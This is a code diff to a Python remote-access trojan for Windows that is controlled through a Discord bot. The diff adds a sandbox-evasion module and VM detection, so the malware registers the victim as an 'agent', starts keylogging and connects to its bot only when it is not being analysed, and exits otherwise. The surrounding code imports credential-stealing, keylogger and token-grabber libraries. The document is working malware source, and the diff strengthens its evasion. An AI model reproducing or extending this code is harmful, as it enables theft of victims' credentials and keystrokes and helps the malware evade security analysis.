@@ -18,7 +18,16 @@ import threading
 import json
 import ctypes
 import re
-from libraries import credentials,keylogger,tokengrabber
+from ctypes.wintypes import HKEY
+import time
+from winreg import HKEY_LOCAL_MACHINE, ConnectRegistry
+import win32api
+import win32process
+import win32pdh
+from winreg import *
+from ctypes import *
+import ctypes
+from libraries import credentials,keylogger,tokengrabber, sandboxevasion
 
 KEYLOG = {KEYLOG}
 
@@ -120,43 +129,6 @@ def createUploads():
     except WindowsError as e:
         if e.winerror == 183:
             pass
-
-ISVM = isVM()
-OS = getOS()
-CPU = getCPU()
-IP = getIP()
-BITS = getBits()
-HOSTNAME = getHostname()
-USERNAME = getUsername()
-createConfig()
-createUploads()
-ISADMIN = isAdmin()
-
-try:
-    path = fr"C:\Users\{USERNAME}\.config\ID"
-    with open(path, "r+") as IDfile:
-        ID = IDfile.read()
-        if ID == "":
-            ID = random.randint(1, 10000)
-            IDfile.write(str(ID))
-            MSG = f"New Agent Online #{ID}"
-            color = 0x00ff00
-        else:
-            MSG = f"Agent Online #{ID}"
-            color = 0x0000FF
-
-except Exception:
-    path = fr"C:\Users\{USERNAME}\.config\ID"
-    with open(path, "w+") as IDfile:
-        ID = IDfile.read()
-        if ID == "":
-            ID = random.randint(1, 10000)
-            IDfile.write(str(ID))
-            MSG = f"New Agent Online #{ID}"
-            color = 0x00ff00
-        else:
-            MSG = f"Agent Online #{ID}"
-            color = 0x0000FF
 
 @client.command(name='cd',pass_context=True)
 async def cd(context):
@@ -418,7 +390,48 @@ async def on_ready():
     my_embed.add_field(name="**Auto Keylogger**", value=KEYLOG, inline=True)
     await channel.send(embed=my_embed)
 
-if KEYLOG:  
-    threading.Thread(target=keylogs).start() 
+if sandboxevasion.test() == True and isVM() == False:
+    ISVM = isVM()
+    OS = getOS()
+    CPU = getCPU()
+    IP = getIP()
+    BITS = getBits()
+    HOSTNAME = getHostname()
+    USERNAME = getUsername()
+    createConfig()
+    createUploads()
+    ISADMIN = isAdmin()
 
-client.run(BOT_TOKEN)
+
+    try:
+        path = fr"C:\Users\{USERNAME}\.config\ID"
+        with open(path, "r+") as IDfile:
+            ID = IDfile.read()
+            if ID == "":
+                ID = random.randint(1, 10000)
+                IDfile.write(str(ID))
+                MSG = f"New Agent Online #{ID}"
+                color = 0x00ff00
+            else:
+                MSG = f"Agent Online #{ID}"
+                color = 0x0000FF
+
+    except Exception:
+        path = fr"C:\Users\{USERNAME}\.config\ID"
+        with open(path, "w+") as IDfile:
+            ID = IDfile.read()
+            if ID == "":
+                ID = random.randint(1, 10000)
+                IDfile.write(str(ID))
+                MSG = f"New Agent Online #{ID}"
+                color = 0x00ff00
+            else:
+                MSG = f"Agent Online #{ID}"
+                color = 0x0000FF
+
+    if KEYLOG:  
+        threading.Thread(target=keylogs).start() 
+
+    client.run(BOT_TOKEN)
+else:
+    exit()
